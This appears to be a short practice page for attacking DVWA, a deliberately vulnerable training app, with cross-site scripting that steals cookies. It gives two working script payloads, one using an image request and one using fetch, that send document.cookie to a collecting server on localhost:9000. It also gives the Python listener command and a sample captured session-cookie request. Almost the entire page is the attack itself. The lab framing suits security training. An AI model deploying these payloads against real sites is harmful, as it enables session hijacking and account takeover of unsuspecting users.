XSS Cookie Stealer

This page demonstrates how stolen cookies would be received.

Payload to inject in DVWA:

<script>new Image().src="http://localhost:9000/steal.php?c="+document.cookie</script>

For Stored XSS (name field):

<script>fetch('http://localhost:9000/log?'+document.cookie)</script>

Captured cookies will appear in server logs:

Check: python3 -m http.server 9000
Look for requests like: GET /steal.php?c=PHPSESSID=xxx;security=low
